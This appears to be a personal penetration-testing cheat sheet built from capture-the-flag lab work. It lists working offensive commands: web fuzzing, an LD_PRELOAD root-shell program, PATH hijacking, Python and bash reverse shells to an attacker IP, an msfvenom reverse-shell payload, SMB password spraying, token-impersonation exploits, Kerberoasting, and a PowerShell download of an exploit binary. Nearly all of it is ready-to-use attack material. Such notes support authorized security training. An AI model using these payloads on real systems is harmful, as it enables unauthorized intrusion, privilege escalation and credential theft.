# Recon
```
Nmap -AV
Nmap UDP
Fuff
Fuzz subdomains/vhosts
Wappalyzer - Fuzz SecLists based on architecture
```

# Web Apps
## Fuzzing
```
Extension: ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
Directories/Files: ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
Recursive: ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://206.189.26.20:31430/FUZZ -recursion -recursion-depth 1 -e .php -v
Subdomain: locate subdomains-top1million-5000.txt - /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
           ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/
           sudo wfuzz -c -w  directory-list-2.3-medium.txt --fc 302 -H "Host: FUZZ.shibboleth.htb" -u http://shibboleth.htb -t 100
Filter Results: -fs 986
Get Req: ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
Post Req: ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
## Misc
### View PHP Source Code
```
If page is fetched via ?<value>=
Use: php://filter/convert.base64-encode/resource=<page.php>
<value>
```

# Operating Systems
## Linux
### PrivEsc
https://gtfobins.github.io/
```
/proc/version - info on system process
/etc/issue info on OS
ps -A all running processes
history
---------------------------------------------------
if sudo -l has env_keep+LD_PRELOAD:
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>

  void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
  }

  gcc -fPIC -shared -o shell.so shell.c nostartfiles
  sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
  
  ---------------------------------------------------
  SUID: find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
        
  getcap -r / 2>/dev/null
   
  Cron Jobs: cat /etc/crontab
  
  Show writable directories: find . -writable
  
  Writable path
           Check can write to path:
                      echo $PATH
                      export PATH=$(pwd):$PATH
                                 (run this in current users home dir)
           Linux will search here for anything you create and run it here first
           
           If no absolute path in admin script command:
                      go to /tmp
                      create that file
                      echo "/bin/bash -p" > <filename>
           
           If you can't get a writable path, run with: sudo PATH=/tmp:$PATH /<directory>/script
Recover all delted file contents: strings /dev/sdb -n 32
```
### Shells
```
Upgrade to TTY: /usr/bin/script -qc /bin/bash /dev/null
Linux: spawn shell as other: sudo -u scriptmanager /bin/bash
Python: spawn shell as root (if run by system process): echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR IP]",[YOUR PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
PHP RCE: bash -c 'bash -i >%26 /dev/tcp/10.10.14.3/9000 0>%261' #
```
## Windows
### SMB
```
After getting in as a low-priv user:
1. Use CrackMapExe to find other usernames
~/tools/CrackMapExec/cme python crackmapexec.py smb <host> -u <username> -p '<password>' --users
2. Password spray with usernames
~/tools/CrackMapExec/cme python crackmapexec.py smb <host> -u users.txt -p '<password>' --continue-on-success
3.Use Impacket's smbexec to check what directories are writable
~/tools/impacket/examples/python smbexec.py <hostname>/<username>@g0.<hostname>
```
### PrivEsc
```
Token Kidnapping.
           Look for tokens like this:
                      UICLSID={7BD29E00-76C1-11CF-9DD0-00A0C9034933}
                      CLSID={FF393560-C2A7-11CF-BFF4-444553540000}
           Check for missions like:
                      SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                      SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
           Juicypotato.exe etc pwns at this
           If the OS is really old, use churrasco.exe. If it says too big for memory, try another DL. Then with a msfvenom shell:
                      churrasco.exe -d "C:\Temp\shell.exe"
```
### MSFVenom Shells
```
Windows Server 2003
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=9444 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
```
### After Getting AD User Login Deets:
```
enum4linux -a -u <username> -p <password> 10.10.10.100

Kerberoast With Impacket:
           GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
                      Then decrypt with hashcat
```
### Misc
```
Download through CMD - powershell -command "Invoke-WebRequest -Uri http://10.10.14.9:9001/41020.exe -Outfile C:\Temp\41020.exe"
compile for x32: i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
compile for x64: x86_64-w64-mingw32-gcc -o test.exe test.c
```

# Misc
```
python3 -m http.server [port no]
GitHub:
           git show
```
